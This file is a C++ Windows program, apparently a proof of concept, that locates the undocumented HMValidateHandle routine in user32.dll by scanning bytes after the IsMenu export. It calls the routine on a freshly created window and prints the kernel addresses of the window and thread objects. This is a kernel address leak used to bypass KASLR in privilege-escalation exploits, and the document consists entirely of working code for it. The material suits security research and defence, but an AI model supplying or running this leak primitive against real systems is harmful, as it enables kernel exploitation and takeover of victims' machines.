// HMValidateHandle.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>

#ifdef _WIN64
typedef void*(NTAPI *lHMValidateHandle)(HWND h, int type);
#else
typedef void*(__fastcall *lHMValidateHandle)(HWND h, int type);
#endif


lHMValidateHandle pHmValidateHandle = NULL;

typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, *PTHROBJHEAD;
//
typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, *PTHRDESKHEAD;


BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}
	
	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

LRESULT CALLBACK MainWProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

int main()
{
	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		printf("Failed to locate HmValidateHandle, exiting\n");
		return 1;
	}
	printf("Found location of HMValidateHandle in user32.dll\n");
	WNDCLASSEX wnd = { 0x0 };
	wnd.cbSize = sizeof(wnd);
	wnd.lpszClassName = TEXT("MainWClass");
	wnd.lpfnWndProc = MainWProc;
	int result = RegisterClassEx(&wnd);
	if (!result)
	{
		printf("RegisterClassEx error: %d\r\n", GetLastError());
	}

	HWND test = CreateWindowEx(
		0,
		wnd.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);
	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(test, 1);

#ifdef _WIN64
	printf("Kernel memory address: 0x%llx, tagTHREAD memory address: 0x%llx\n", tagWND->pSelf, tagWND->h.pti);
#else
	printf("Kernel memory address: 0x%X, tagTHREAD memory address: 0x%X\n", tagWND->pSelf, tagWND->h.pti);
#endif
	return 0;
}

